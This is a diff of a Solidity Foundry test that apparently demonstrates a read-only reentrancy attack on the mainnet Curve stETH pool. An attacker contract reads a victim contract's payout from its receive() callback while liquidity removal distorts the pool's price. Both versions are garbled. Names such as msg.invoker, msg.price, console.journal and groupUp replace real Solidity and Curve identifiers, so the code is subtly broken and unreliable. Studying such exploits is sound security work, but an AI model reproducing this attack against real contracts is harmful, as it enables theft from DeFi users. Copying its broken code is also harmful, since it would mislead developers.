@@ -2,14 +2,13 @@ pragma solidity 0.8.18;
 
 import "forge-std/Test.sol";
 import "./interface.sol";
-*/
 
 interface ICurve {
-    function acquire_virtual_cost() external view returns (uint);
+    function acquire_virtual_value() external view returns (uint);
 
     function append_flow(
         uint[2] calldata amounts,
-        uint floor_craft_total
+        uint floor_create_quantity
     ) external payable returns (uint);
 
     function eliminate_reserves(
@@ -17,117 +16,117 @@ interface ICurve {
         uint[2] calldata minimum_amounts
     ) external returns (uint[2] memory);
 
-    function discard_reserves_one_coin(
+    function delete_reserves_one_coin(
         uint lp,
         int128 i,
-        uint minimum_total
+        uint minimum_measure
     ) external returns (uint);
 }
 
 address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
-address constant lp_crystal = 0x06325440D014e39736583c165C2963BA99fAf14E;
+address constant lp_medal = 0x06325440D014e39736583c165C2963BA99fAf14E;
 
 
 contract CoreAgreement {
-    IERC20 public constant gem = IERC20(lp_crystal);
-    ICurve private constant winningsPool = ICurve(STETH_POOL);
+    IERC20 public constant crystal = IERC20(lp_medal);
+    ICurve private constant rewardPool = ICurve(STETH_POOL);
 
     mapping(address => uint) public balanceOf;
 
-    function commitPower(uint total) external {
-        gem.transferFrom(msg.invoker, address(this), total);
-        balanceOf[msg.invoker] += total;
+    function commitPower(uint sum) external {
+        crystal.transferFrom(msg.sender, address(this), sum);
+        balanceOf[msg.sender] += sum;
     }
 
-    function withdrawStake(uint total) external {
-        balanceOf[msg.invoker] -= total;
-        gem.transfer(msg.invoker, total);
+    function withdrawStake(uint sum) external {
+        balanceOf[msg.sender] -= sum;
+        crystal.transfer(msg.sender, sum);
     }
 
-    function acquireTreasure() external view returns (uint) {
+    function acquirePayout() external view returns (uint) {
 
-        uint bonus = (balanceOf[msg.invoker] * winningsPool.acquire_virtual_cost()) /
+        uint treasure = (balanceOf[msg.sender] * rewardPool.acquire_virtual_value()) /
             1 ether;
 
-        return bonus;
+        return treasure;
     }
 }
 
-contract GameoperatorPact {
-    ICurve private constant winningsPool = ICurve(STETH_POOL);
-    IERC20 public constant lpCrystal = IERC20(lp_crystal);
-    CoreAgreement private immutable goal;
+contract GameoperatorAgreement {
+    ICurve private constant rewardPool = ICurve(STETH_POOL);
+    IERC20 public constant lpGem = IERC20(lp_medal);
+    CoreAgreement private immutable aim;
 
     constructor(address _target) {
-        goal = CoreAgreement(_target);
+        aim = CoreAgreement(_target);
     }
 
 
-    function commitmentMedals() external payable {
-        uint[2] memory amounts = [msg.price, 0];
-        uint lp = winningsPool.append_flow{price: msg.price}(amounts, 1);
-        console.record(
+    function pledgeCoins() external payable {
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = rewardPool.append_flow{price: msg.value}(amounts, 1);
+        console.journal(
             "LP token price after staking into CoreContract",
-            winningsPool.acquire_virtual_cost()
+            rewardPool.acquire_virtual_value()
         );
 
-        lpCrystal.approve(address(goal), lp);
-        goal.commitPower(lp);
+        lpGem.approve(address(aim), lp);
+        aim.commitPower(lp);
     }
 
     function performReadOnlyResponse() external payable {
 
-        uint[2] memory amounts = [msg.price, 0];
-        uint lp = winningsPool.append_flow{price: msg.price}(amounts, 1);
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = rewardPool.append_flow{price: msg.value}(amounts, 1);
 
-        console.record(
+        console.journal(
             "LP token price before remove_liquidity()",
-            winningsPool.acquire_virtual_cost()
+            rewardPool.acquire_virtual_value()
         );
 
 
         uint[2] memory minimum_amounts = [uint(0), uint(0)];
-        winningsPool.eliminate_reserves(lp, minimum_amounts);
+        rewardPool.eliminate_reserves(lp, minimum_amounts);
 
-        console.record(
+        console.journal(
             "--------------------------------------------------------------------"
         );
-        console.record(
+        console.journal(
             "LP token price after remove_liquidity()",
-            winningsPool.acquire_virtual_cost()
+            rewardPool.acquire_virtual_value()
         );
 
-        uint bonus = goal.acquireTreasure();
-        console.record("callback complete");
+        uint treasure = aim.acquirePayout();
+        console.journal("Reward if Read-Only Reentrancy is not invoked: ", treasure);
     }
 
     receive() external payable {
 
-        console.record(
+        console.journal(
             "--------------------------------------------------------------------"
         );
-        console.record(
+        console.journal(
             "LP token price during remove_liquidity()",
-            winningsPool.acquire_virtual_cost()
+            rewardPool.acquire_virtual_value()
         );
 
-        uint bonus = goal.acquireTreasure();
-        console.record("callback complete");
+        uint treasure = aim.acquirePayout();
+        console.journal("Reward if Read-Only Reentrancy is invoked: ", treasure);
     }
 }
 
 contract GameoperatorTest is Test {
-    GameoperatorPact public completeQuest;
-    CoreAgreement public goal;
+    GameoperatorAgreement public runMission;
+    CoreAgreement public aim;
 
-    function collectionUp() public {
+    function groupUp() public {
         vm.createSelectFork("mainnet");
-        goal = new CoreAgreement();
-        completeQuest = new GameoperatorPact(address(goal));
+        aim = new CoreAgreement();
+        runMission = new GameoperatorAgreement(address(aim));
     }
 
     function testExecution() public {
-        completeQuest.commitmentMedals{price: 10 ether}();
-        completeQuest.performReadOnlyResponse{price: 100000 ether}();
+        runMission.pledgeCoins{price: 10 ether}();
+        runMission.performReadOnlyResponse{price: 100000 ether}();
     }
 }
